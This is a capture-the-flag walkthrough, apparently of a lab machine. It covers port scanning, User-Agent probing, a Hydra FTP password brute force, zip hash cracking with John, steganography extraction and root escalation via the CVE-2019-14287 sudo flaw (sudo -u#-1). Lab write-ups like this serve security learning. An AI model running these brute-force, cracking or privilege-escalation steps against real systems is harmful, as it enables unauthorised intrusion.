
---

# 🔐 CTF Walkthrough – From User to Root

## 1. Initial Enumeration

Scan the target for open ports and services:

```bash
nmap -Pn -sV -O 0.0.0.0
```

- Discovered a web service running.
    
- Webpage requires a **custom User-Agent** to reveal clues.
    

---

## 2. Web Enumeration

Access the webpage with a different header:

```bash
curl -A "R" http://0.0.0.0
```

- A clue is revealed.
    

Try another User-Agent:

```bash
curl -A "C" -i http://0.0.0.0
```

- Found hints about a **secret page**.
    

---

## 3. FTP Bruteforce

Using Hydra to brute force FTP login:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://0.0.0.0
```

- Successfully authenticated as **chris**.
    
- Found 3 files inside FTP.
    

---

## 4. File Analysis

Use **binwalk** to extract hidden data:

```bash
binwalk --run-as=root -e cutie.png
```

- Extracted a **ZIP archive**.
    

Crack the password-protected ZIP:

```bash
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Extract files:

```bash
7z x 8702.zip
```

Decode hidden base64 string:

```bash
echo "QXJlYTUx" | base64 -d
```

---

## 5. Steganography

Hidden message inside **cute-alien.jpg**:

```bash
steghide extract -sf cute-alien.jpg
```

- Extracted credentials → retrieved **user flag**.
    

---

## 6. Privilege Escalation

Target is vulnerable to **CVE-2019-14287 (sudo flaw)**.  
Exploit using crafted sudo command:

```bash
# Run exploit script or directly abuse sudo -u#-1
```

- Escalated to **root**.
    
- Retrieved **root flag**.
    

---

# ✅ Summary

- Enumeration revealed custom User-Agent checks.
    
- FTP cracked with Hydra → hidden files → extracted ZIP.
    
- Steganography revealed user flag.
    
- Privilege escalation via CVE-2019-14287 → root flag obtained.
    

---
